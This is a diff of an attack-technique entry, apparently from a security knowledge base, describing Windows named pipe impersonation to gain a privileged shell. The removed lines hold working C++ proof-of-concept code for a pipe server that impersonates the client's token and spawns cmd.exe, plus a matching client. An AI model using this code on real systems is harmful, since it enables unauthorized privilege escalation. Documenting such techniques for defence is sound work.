@@ -47,85 +47,7 @@ extended_description: |
     | [Privileged access]()                                                 | Possibility to execute action with privileged access, for example "domain administrator" shell |
 
     ## Attack progress
-    1) To successfully execute the attack an attacker needs to perform communication between "pipe server" and "pipe client". Below is the PoC code for both the server and the client.
-    <details>
-    <summary><b>Pipe server</b></summary>
-    
-    ```
-    #include <Windows.h>
-    #include <iostream>
-
-    int main() {
-      LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
-      LPVOID pipeBuffer = NULL;
-      HANDLE serverPipe;
-      DWORD readBytes = 0;
-      DWORD readBuffer = 0;
-      int err = 0;
-      BOOL isPipeConnected;
-      BOOL isPipeOpen;
-      wchar_t message[] = L"Cyberok";
-      DWORD messageLenght = lstrlen(message) * 2;
-      DWORD bytesWritten = 0;
-      STARTUPINFO	*si = new STARTUPINFO();
-      wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
-      PROCESS_INFORMATION *pi = new PROCESS_INFORMATION();
-      HANDLE
-        threadToken,
-        duplicatedToken = NULL;
-        
-      std::wcout << "Creating named pipe " << pipeName << std::endl;
-      serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-      
-      isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
-      if (isPipeConnected) {
-        std::wcout << "Incoming connection to " << pipeName << std::endl;
-      }
-      
-      std::wcout << "Sending message: " << message << std::endl;
-      WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
-      
-      std::wcout << "Impersonating the client..." << std::endl;
-      ImpersonateNamedPipeClient(serverPipe);
-      
-      OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &threadToken);
-      DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicatedToken);
-      CreateProcessWithTokenW(duplicatedToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, si, pi);
-      return 0;
-    }
-    
-    ```
-    </details>
-    
-    <details>
-    <summary><b>Pipe client</b></summary>
-    
-    ```
-    #include <iostream>
-    #include <Windows.h>
-
-    const int MESSAGE_SIZE = 512;
-
-    int main()
-    {
-      LPCWSTR pipeName = L"\\\\192.168.101.109\\pipe\\mantvydas-first-pipe";
-      HANDLE clientPipe = NULL;
-      BOOL isPipeRead = true;
-      wchar_t message[MESSAGE_SIZE] = { 0 };
-      DWORD bytesRead = 0;
-      
-      std::wcout << "Connecting to " << pipeName << std::endl;
-      clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-      
-      while (isPipeRead) {
-        isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
-        std::wcout << "Received message: " << message;
-      }
-      
-      return 0;
-    }
-    ```
-    </details>
+    1) To successfully execute the attack an attacker needs to perform communication between "pipe server" and "pipe client".
     
     Below image shows the named pipe server and named pipe client working as expected
     ![Working_example](13.JPG)
@@ -136,10 +58,6 @@ extended_description: |
     Similary, we can see the client having an open handle to [the named pipe](/artifacts/A_5003_windows_pipe/entity "mantvydas-first-pipe")
     ![Pipe_client](12.JPG)
     
-    To see particular pipe with [powershell](/software/S_0004_windows_powershell/entity) use command:
-    ```
-    ((Get-ChildItem \\.\pipe\).name)[-1..-5]
-    ```
     2) It is possible for the named pipe server to impersonate the named pipe client's security context by leveraging a ImpersonateNamedPipeClient API call which in turn changes the named pipe server's [current thread's token](/artifacts/A_5004_access_token/entity "domain administrator's access token") with that of the named pipe client's token.
     
     Running the server and connecting to it with the client that is running under administrator@alpha.local security context, we can see that the main thread of the named server pipe assumed the token of the named pipe client - ALPHA\administrator, although the PipeServer.exe itself is running under ALPHA\aegorov security context. 
@@ -148,8 +66,6 @@ extended_description: |
     
     1) This technique allows to gain privileged shell. 
     ![POC](14.JPG)
-    
-    To change any process to lauch - modify code in PoC Server, needed variable : **wchar_t command[]**.
     
     ## Attack diagram
     ![Diagram](37.svg)
